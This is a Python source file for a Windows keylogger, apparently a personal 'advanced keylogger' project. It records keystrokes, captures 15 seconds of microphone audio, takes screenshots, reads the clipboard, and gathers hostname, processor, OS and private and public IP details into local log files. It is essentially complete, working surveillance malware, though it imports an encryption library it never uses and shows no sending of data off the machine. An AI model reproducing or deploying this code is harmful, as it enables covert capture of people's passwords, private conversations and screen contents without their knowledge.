# Libraries

# Libraries for collecting computer information.
import socket
import platform

# Library for system info & time.
import time
import os

# Library for registring keystrokes.
from pynput.keyboard import Key, Listener

# Library for clipboard.
import win32clipboard

# Library for mic capabilities.
from scipy.io.wavfile import write
import sounddevice as sd

# Library for Encryption.
from cryptography.fernet import Fernet

import getpass
from requests import get

# Library for importing screenshots.
from multiprocessing import Process, freeze_support
from PIL import ImageGrab


# Log file 

keys_info = "key_log.txt"
system_info = "sys_info.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio_recording.wav"
screenshot_info = "screenshot.png"
microphone_time = 15
time_iteration = 20
number_of_iterations_end = 5
file_path = "C:\\Users\\MSI PC\\Desktop\\ADVANCED KEYLOGGER\\project"
extend = "\\"

def get_system_info():
    with open(file_path + extend + "sys_info.txt", "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception as e:
            f.write("Could not get public IP address: " + str(e))
        
        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

get_system_info()

def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: " + pasted_data + "\n")
        except Exception as e:
            f.write("Could not read clipboard: " + str(e))
        
def record_audio():
    fs = 44100  
    seconds = microphone_time 

    try:
        print("Recording audio...")
        recorded_audio = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()  
        write(file_path + extend + "audio_recording.wav", fs, recorded_audio)  
        print("Audio recording saved.")
    except Exception as e:
        print("Error recording audio:", str(e))

record_audio()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_info, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_info, "w") as f:
            f.write(" ")

        screenshot()

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration